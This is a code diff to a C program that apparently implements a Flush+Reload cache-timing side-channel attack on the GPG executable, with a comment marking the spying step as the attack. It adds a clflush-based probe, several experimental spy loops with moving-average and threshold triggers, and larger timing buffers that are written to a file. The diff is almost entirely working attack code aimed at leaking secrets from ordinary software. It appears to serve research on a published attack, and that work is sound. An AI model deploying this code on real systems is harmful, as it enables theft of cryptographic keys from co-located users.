@@ -3,12 +3,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <sys/mman.h>
+#include <time.h>
 #include <unistd.h>
+#include <string.h>
+#include <sched.h>
 
 #include "args.h"
 
-// Roughly 4 MB. Always ensure that the executable is smaller than this
-#define GPG_MAX_SIZE_BYTES 4194304
+// Roughly 8 MB. Always ensure that the executable is smaller than this
+#define GPG_MAX_SIZE_BYTES 8388608
 
 // See paper for the threshold of probe()
 #define PROBE_THRESHOLD 110ul
@@ -17,7 +20,7 @@
 #define MAX_NUM_OF_ADDRS 10u
 
 // Number of time slots to record
-#define TIME_SLOTS 50000
+#define TIME_SLOTS 100000
 
 #define busy_wait(cycles) for(volatile long i_ = 0; i_ != cycles; i_++)\
                                                  ;
@@ -47,6 +50,7 @@ unsigned long probe_timing(char *adrs) {
     volatile unsigned long time;
 
     asm __volatile__(
+        "    clflush 0(%1)      \n"
         "    mfence             \n"
         "    lfence             \n"
         "    rdtsc              \n"
@@ -64,22 +68,174 @@ unsigned long probe_timing(char *adrs) {
     return time;
 }
 
+unsigned long probe_timing_no_clflush(char *adrs) {
+    volatile unsigned long time;
+
+    asm __volatile__(
+        "    mfence             \n"
+        "    lfence             \n"
+        "    rdtsc              \n"
+        "    lfence             \n"
+        "    movl %%eax, %%esi  \n"
+        "    movl (%1), %%eax   \n"
+        "    lfence             \n"
+        "    rdtsc              \n"
+        "    subl %%esi, %%eax  \n"
+        : "=a" (time)
+        : "c" (adrs)
+        : "%esi", "%edx"
+    );
+    return time;
+}
+
 typedef struct {
     unsigned long result[MAX_NUM_OF_ADDRS];
 } time_slot;
 
 #ifndef DYNAMIC_TIMING
 
+//#define AVG_LEN 1000
+// #define AVG_LEN 800
+// #define AVG_LEN 100
+// #define AVG_LEN 30
+#define AVG_LEN 3
+
+void spy_store(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
+        int busy_cycles) {
+
+    for (size_t slot = 0; slot < num_slots; slot++) {
+	//for (int addr = 0; addr < (int) num_addrs; addr++) {
+	for (int addr = num_addrs - 1; addr >= 0; addr--) {
+	    char *ptr = addrs[addr];
+	    unsigned long result = probe_timing(ptr);
+	    slots[slot].result[addr] = result;
+	}
+	busy_wait(busy_cycles);
+    }
+
+    printf("Done!\n");
+}
+
 void spy(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
         int busy_cycles) {
-    for (size_t slot = 0; slot < num_slots; slot++) {
+
+    int running = 1;
+    unsigned long avg_sum = 0;
+
+    for (size_t slot = 0; slot < AVG_LEN; slot++) {
         for (int addr = 0; addr < (int) num_addrs; addr++) {
             char *ptr = addrs[addr];
-            unsigned long result = probe_timing(ptr);
-            slots[slot].result[addr] = result;
+            slots[slot].result[addr] = 100000;
+            avg_sum += 100000;
         }
-        busy_wait(busy_cycles);
     }
+
+    while (running) {
+            for (size_t slot = AVG_LEN; slot < num_slots; slot++) {
+                for (int addr = 0; addr < (int) num_addrs; addr++) {
+                    char *ptr = addrs[addr];
+                    unsigned long result = probe_timing(ptr);
+                    slots[slot].result[addr] = result;
+
+                    avg_sum += result;
+                    avg_sum -= slots[slot - AVG_LEN].result[addr];
+
+                    //if (avg_sum < 340000) {
+                    // if (avg_sum < 155000) {
+                    // if (avg_sum < 18000) {
+                    // if (avg_sum < 5500) {
+                    if (avg_sum < 532) {
+                            printf("avg_sum: %ld\n", avg_sum);
+                            running = 0;
+                            slot = num_slots;
+                            break;
+                    }
+                }
+                busy_wait(busy_cycles);
+            }
+
+            if (!running) {
+                    break;
+            }
+
+               /*
+            printf("Before: %ld\n", avg_sum);
+            unsigned long test_sum = 0;
+            for (int i = num_slots - AVG_LEN; i < num_slots; i++) {
+                    test_sum += slots[i].result[0];
+            }
+            printf("Test sum: %ld\n", avg_sum);
+            printf("First: %ld\n", slots[num_slots - AVG_LEN].result[0]);
+            */
+
+            memcpy(slots, slots + num_slots - AVG_LEN, AVG_LEN * sizeof(*slots));
+
+            //printf("Change\n");
+    }
+
+    printf("Done!\n");
+}
+
+void spy_min(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
+        int busy_cycles) {
+
+    int running = 1;
+    
+    char *ptr = addrs[0];
+    while (running) {
+	    unsigned long result = probe_timing(ptr);
+
+	    if (result < 100) {
+		    printf("result: %ld\n", result);
+		    running = 0;
+		    break;
+	    }
+	    busy_wait(busy_cycles);
+	    sched_yield();
+    }
+
+    printf("Done!\n");
+}
+
+void spy_sleep_min(char **addrs, size_t num_addrs, time_slot *slots, size_t num_slots,
+        int busy_cycles) {
+
+    char *ptr = addrs[0];
+    unsigned long result;
+
+    for (int i = 0; i < 10; i++) {
+    	result = probe_timing(ptr);
+        printf("first: %ld\n", result);
+    }
+
+    printf("test: %d\n", *ptr);
+    printf("test: %d\n", *(addrs[1]));
+    printf("test: %d\n", *(addrs[2]));
+
+    int t1 = clock();
+    int sum = 0;
+    for (int j = 0; j < 2; j++) {
+	    for (int i = 0; i < 500000/*1000000000*/; i++) {
+		    sum += i * i + sum + i * sum;
+	    }
+    }
+    int delta = clock() - t1;
+
+    printf("delta: %d\n", delta);
+    printf("delta: %ld\n", CLOCKS_PER_SEC);
+
+    result = probe_timing(ptr);
+    printf("result: %ld\n", result);
+
+    ptr = addrs[1];
+    result = probe_timing(ptr);
+    printf("result: %ld\n", result);
+
+    ptr = addrs[2];
+    result = probe_timing(ptr);
+    printf("result: %ld\n", result);
+
+    printf("Done!\n");
 }
 
 #else
@@ -145,6 +301,8 @@ void offset_addresses(void *gpg_base, char **addrs, size_t num_addrs) {
         addrs[i] = adjusted_ptr;
     }
 }
+   
+time_slot slots[TIME_SLOTS];
 
 int main(int argc, char *argv[]) {
     struct args_st arguments;
@@ -185,8 +343,7 @@ int main(int argc, char *argv[]) {
 
     // ATTAAAAACK!
     printf("Started spying\n");
-    time_slot slots[TIME_SLOTS];
-    spy(addrs, num_addrs, slots, TIME_SLOTS, arguments.busy_cycles);
+    spy_store(addrs, num_addrs, slots, TIME_SLOTS, arguments.busy_cycles);
     printf("Finished spying\n");
 
     write_slots_to_file(num_addrs, slots, TIME_SLOTS, arguments.out_file);
